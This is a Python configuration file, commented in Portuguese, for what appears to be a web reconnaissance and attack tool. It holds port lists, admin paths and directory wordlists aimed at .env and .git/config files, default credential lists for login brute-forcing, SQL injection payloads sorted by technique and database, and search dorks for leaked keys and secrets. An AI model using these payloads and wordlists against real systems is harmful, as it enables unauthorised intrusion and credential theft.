#Constantes, wordlists e configurações globais

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
REQUEST_TIMEOUT = 10
MAX_THREADS = 10

#Portas comuns para scan
COMMON_PORTS = [21, 22, 25, 80, 443, 3306, 5432, 8080, 8443, 9443, 27017]

#Caminhos administrativos (Da para atualizar)
COMMON_ADMIN_PATHS = [
    "/admin", "/administrator", "/login", "/wp-admin", "/user/login",
    "/cpanel", "/phpmyadmin", "/pma", "/myadmin", "/manager/html"
]

#Wordlist para brute force de diretórios
DEFAULT_WORDLIST = [
    "admin", "backup", "config", "db", "dev", "download", "files", "include",
    "logs", "private", "secret", "temp", "test", "upload", "vendor", "www",
    ".env", ".git/config", ".htaccess", "wp-config.php", "configuration.php"
]

#Wordlists para brute force de login
DEFAULT_USERLIST = ["admin", "root", "user", "test", "guest", "info", "adm"]
DEFAULT_PASSLIST = ["admin", "123456", "password", "root", "test", "guest", "info", "adm", "1234", "12345"]

#Payloads SQL Injection
SQLI_PAYLOADS = {
    'error_based': {
        'mysql': ["'", "\"", "1' AND 1=1--", "1' AND 1=2--", "' OR '1'='1", "' OR 1=1--", "admin'--"],
        'mssql': ["'", "\"", "1' AND 1=1--", "1' AND 1=2--", "' OR '1'='1", "'; WAITFOR DELAY '00:00:05'--"],
        'oracle': ["'", "\"", "1' AND 1=1--", "1' AND 1=2--", "' OR '1'='1", "' UNION SELECT NULL FROM DUAL--"],
        'postgresql': ["'", "\"", "1' AND 1=1--", "1' AND 1=2--", "' OR '1'='1", "' UNION SELECT NULL--"],
        'generic': ["'", "\"", "1' AND 1=1", "1' AND 1=2", "' OR '1'='1", "admin'--"]
    },
    'union_based': {
        'generic': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION SELECT 1,@@version,3--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
            "1' GROUP BY 1--", "1' GROUP BY 2--", "1' GROUP BY 3--"
        ]
    },
    'boolean_based': {
        'generic': [
            "1' AND '1'='1", "1' AND '1'='2",
            "' AND 1=1--", "' AND 1=2--",
            "' OR 1=1--", "' OR 1=2--",
            "1' AND 1=1--", "1' AND 1=2--"
        ]
    },
    'time_based': {
        'mysql': ["' AND SLEEP(5)--", "1' AND SLEEP(5)--", "' OR SLEEP(5)--"],
        'mssql': ["'; WAITFOR DELAY '00:00:05'--", "1'; WAITFOR DELAY '00:00:05'--"],
        'postgresql': ["'; SELECT pg_sleep(5)--", "1'; SELECT pg_sleep(5)--"],
        'oracle': ["' AND dbms_pipe.receive_message(('a'),5)--", "1' AND dbms_pipe.receive_message(('a'),5)--"],
        'generic': ["' AND SLEEP(5)--", "1' AND SLEEP(5)--"]
    }
}

#Fontes de dorks
DORK_SOURCES = [
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/all-google-dorks.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/best-google-dorks.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-best-log.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-env-files.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-git-files.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-database-files.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-backups.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-login.txt",
    "https://raw.githubusercontent.com/Proviesec/google-dorks/main/google-dorks-for-js-secrets.txt",
]

THIRD_PARTY_DORKS = [
    "site:pastebin.com \"{dominio}\"",
    "site:gist.github.com \"{dominio}\"",
    "site:github.com \"{dominio}\" \"password\" OR \"api_key\" OR \"secret\" OR \"token\"",
    "site:github.com \"{dominio}\" filename:.env",
    "site:github.com \"{dominio}\" extension:pem",
    "site:github.com \"{dominio}\" AWS_SECRET_ACCESS_KEY",
    "site:docs.google.com \"{dominio}\"",
    "site:slideshare.net \"{dominio}\"",
    "site:scribd.com \"{dominio}\"",
    "site:*.{dominio}",
    "site:*.*.{dominio}",
]